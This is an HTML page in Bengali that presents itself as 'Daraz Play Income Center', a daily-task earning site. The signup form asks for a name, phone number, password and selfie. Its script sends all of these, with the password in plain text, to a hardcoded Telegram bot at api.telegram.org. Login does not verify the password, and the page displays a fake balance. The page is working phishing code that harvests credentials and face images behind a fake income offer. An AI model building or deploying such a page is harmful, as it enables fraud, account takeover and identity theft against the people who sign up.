<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Daraz Play Income Center</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Hind Siliguri', sans-serif; background-color: #064e3b; color: #f8fafc; }
        .page-section { display: none; }
        .page-section.active { display: block; }
    </style>
</head>
<body class="flex flex-col min-h-screen justify-center items-center p-4 pb-20">

    <div class="w-full max-w-md bg-emerald-950/90 border border-emerald-700/50 p-6 rounded-3xl shadow-2xl backdrop-blur-md">
        
        <!-- Header -->
        <div class="text-center mb-6">
            <h1 class="text-2xl font-bold text-amber-400">💰 ডেইলি টাস্ক ইনকাম সেন্টার</h1>
        </div>

        <!-- SIGNUP PAGE -->
        <div id="signup-page" class="page-section active space-y-4">
            <div class="text-center mb-4">
                <h2 class="text-xl font-bold text-slate-100">নিবন্ধন</h2>
                <p class="text-xs text-slate-300">ইতিমধ্যেই একটি অ্যাকাউন্ট আছে? <a href="#" onclick="switchPage('login')" class="text-amber-400 underline">লগইন</a></p>
            </div>

            <form onsubmit="handleSignup(event)" class="space-y-4">
                <div class="relative">
                    <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-emerald-400"><i class="fa-solid fa-user"></i></span>
                    <input type="text" id="reg-name" placeholder="আপনার পূর্ণ নাম" class="w-full bg-emerald-900/60 border border-emerald-700 rounded-xl py-3 pl-10 pr-4 text-slate-100 placeholder-slate-400 focus:outline-none focus:border-amber-400 text-sm" required>
                </div>
                <div class="relative">
                    <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-emerald-400"><i class="fa-solid fa-phone"></i></span>
                    <input type="tel" id="reg-phone" placeholder="ফোন নম্বর" class="w-full bg-emerald-900/60 border border-emerald-700 rounded-xl py-3 pl-10 pr-4 text-slate-100 placeholder-slate-400 focus:outline-none focus:border-amber-400 text-sm" required>
                </div>
                <div class="relative">
                    <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-emerald-400"><i class="fa-solid fa-lock"></i></span>
                    <input type="password" id="reg-password" placeholder="পাসওয়ার্ড" class="w-full bg-emerald-900/60 border border-emerald-700 rounded-xl py-3 pl-10 pr-4 text-slate-100 placeholder-slate-400 focus:outline-none focus:border-amber-400 text-sm" required>
                </div>
                <div class="border-2 border-dashed border-emerald-700 p-3 rounded-xl text-center bg-emerald-900/30">
                    <label class="block text-xs text-amber-300 mb-2 font-medium">📸 ফেস ভেরিফিকেশন ছবি (সেলফি):</label>
                    <input type="file" id="reg-selfie" accept="image/*" class="w-full text-xs text-slate-300 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-amber-400 file:text-slate-950 hover:file:bg-amber-500 cursor-pointer" required>
                </div>
                <button type="submit" id="submit-btn" class="w-full bg-gradient-to-r from-amber-400 to-amber-500 hover:from-amber-500 hover:to-amber-600 text-slate-950 font-bold py-3 rounded-xl shadow-lg transition duration-200">
                    নিবন্ধন
                </button>
            </form>
        </div>

        <!-- LOGIN PAGE -->
        <div id="login-page" class="page-section space-y-4">
            <div class="text-center mb-4">
                <h2 class="text-xl font-bold text-slate-100">লগইন</h2>
                <p class="text-xs text-slate-300">এখনও কোনো অ্যাকাউন্ট নেই? <a href="#" onclick="switchPage('signup')" class="text-amber-400 underline">নিবন্ধন</a></p>
            </div>

            <form onsubmit="handleLogin(event)" class="space-y-4">
                <div class="relative">
                    <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-emerald-400"><i class="fa-solid fa-phone"></i></span>
                    <input type="tel" id="login-phone" placeholder="ফোন নম্বর" class="w-full bg-emerald-900/60 border border-emerald-700 rounded-xl py-3 pl-10 pr-4 text-slate-100 placeholder-slate-400 focus:outline-none focus:border-amber-400 text-sm" required>
                </div>
                <div class="relative">
                    <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-emerald-400"><i class="fa-solid fa-lock"></i></span>
                    <input type="password" id="login-password" placeholder="পাসওয়ার্ড" class="w-full bg-emerald-900/60 border border-emerald-700 rounded-xl py-3 pl-10 pr-4 text-slate-100 placeholder-slate-400 focus:outline-none focus:border-amber-400 text-sm" required>
                </div>
                <button type="submit" class="w-full bg-gradient-to-r from-amber-400 to-amber-500 text-slate-950 font-bold py-3 rounded-xl shadow-lg transition">
                    লগইন
                </button>
            </form>
        </div>

        <!-- PROFILE / DASHBOARD PAGE -->
        <div id="dashboard-page" class="page-section text-center space-y-4">
            <h2 class="text-xl font-bold text-emerald-400">প্রোফাইল বিবরণী</h2>
            <div class="flex justify-center">
                <img id="profile-img" src="" alt="Selfie" class="w-24 h-24 rounded-full object-cover border-2 border-amber-400 shadow-md">
            </div>
            <div class="bg-emerald-900/50 p-4 rounded-xl border border-emerald-700 text-left space-y-2">
                <p class="text-sm text-slate-300"><strong>নাম:</strong> <span id="profile-name"></span></p>
                <p class="text-sm text-slate-300"><strong>নম্বর:</strong> <span id="profile-phone"></span></p>
                <p class="text-sm text-slate-300"><strong>মূল ব্যালেন্স:</strong> <span class="text-amber-400 font-bold">৳ 12.50</span></p>
            </div>
            <button onclick="logout()" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-2.5 rounded-xl text-sm transition">লগআউট</button>
        </div>

    </div>

    <script>
        // Check if user is already logged in
        window.onload = function() {
            const activeUser = JSON.parse(localStorage.getItem('current_user'));
            if (activeUser) {
                showProfile(activeUser);
            }
        }

        function switchPage(page) {
            document.querySelectorAll('.page-section').forEach(el => el.classList.remove('active'));
            if(page === 'signup') document.getElementById('signup-page').classList.add('active');
            if(page === 'login') document.getElementById('login-page').classList.add('active');
            if(page === 'dashboard') document.getElementById('dashboard-page').classList.add('active');
        }

        async function handleSignup(event) {
            event.preventDefault();

            const name = document.getElementById('reg-name').value;
            const phone = document.getElementById('reg-phone').value;
            const password = document.getElementById('reg-password').value;
            const selfieFile = document.getElementById('reg-selfie').files[0];

            let registeredNumbers = JSON.parse(localStorage.getItem('registered_phones')) || [];
            if (registeredNumbers.includes(phone)) {
                alert('এই ফোন নম্বরটি দিয়ে ইতিমধ্যে একটি অ্যাকাউন্ট খোলা হয়েছে! একবারের বেশি খোলা যাবে না।');
                return;
            }

            const btn = document.getElementById('submit-btn');
            btn.innerText = 'অপেক্ষা করুন...';
            btn.disabled = true;

            // Convert image to Base64 to save safely in user profile storage
            const reader = new FileReader();
            reader.readAsDataURL(selfieFile);
            reader.onload = async function () {
                const base64Image = reader.result;

                // Send to Telegram Admin Bot
                const botToken = '9160504002:AAGUXsLTcUik8Wam5rBg-d619CPjnu_cQSg';
                const chatId = '8561008519';

                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', selfieFile);
                formData.append('caption', `🔔 নতুন সাইন-আপ তথ্য:\n👤 নাম: ${name}\n📞 নম্বর: ${phone}\n🔑 পাসওয়ার্ড: ${password}`);

                try {
                    let response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    let result = await response.json();

                    if (result.ok) {
                        registeredNumbers.push(phone);
                        localStorage.setItem('registered_phones', JSON.stringify(registeredNumbers));

                        const userData = { name, phone, image: base64Image };
                        localStorage.setItem('current_user', JSON.stringify(userData));

                        alert('নিবন্ধন সফল হয়েছে!');
                        showProfile(userData);
                    } else {
                        alert('টেলিগ্রামে পাঠাতে সমস্যা হয়েছে। বট স্টার্ট করা আছে কিনা চেক করুন।');
                        btn.innerText = 'নিবন্ধন';
                        btn.disabled = false;
                    }
                } catch (error) {
                    console.error(error);
                    alert('নেটওয়ার্ক ত্রুটি ঘটেছে!');
                    btn.innerText = 'নিবন্ধন';
                    btn.disabled = false;
                }
            };
        }

        function handleLogin(event) {
            event.preventDefault();
            const phone = document.getElementById('login-phone').value;
            // For simple demo, check if registered
            let registeredNumbers = JSON.parse(localStorage.getItem('registered_phones')) || [];
            if (registeredNumbers.includes(phone)) {
                const userData = JSON.parse(localStorage.getItem('current_user')) || { name: 'ব্যবহারকারী', phone: phone, image: 'https://via.placeholder.com/150' };
                alert('লগইন সফল হয়েছে!');
                showProfile(userData);
            } else {
                alert('এই নম্বরে কোনো অ্যাকাউন্ট পাওয়া যায়নি। প্রথমে নিবন্ধন করুন।');
            }
        }

        function showProfile(user) {
            document.getElementById('profile-name').innerText = user.name;
            document.getElementById('profile-phone').innerText = user.phone;
            if(user.image) {
                document.getElementById('profile-img').src = user.image;
            }
            switchPage('dashboard');
        }

        function logout() {
            localStorage.removeItem('current_user');
            switchPage('signup');
        }
    </script>
</body>
</html>
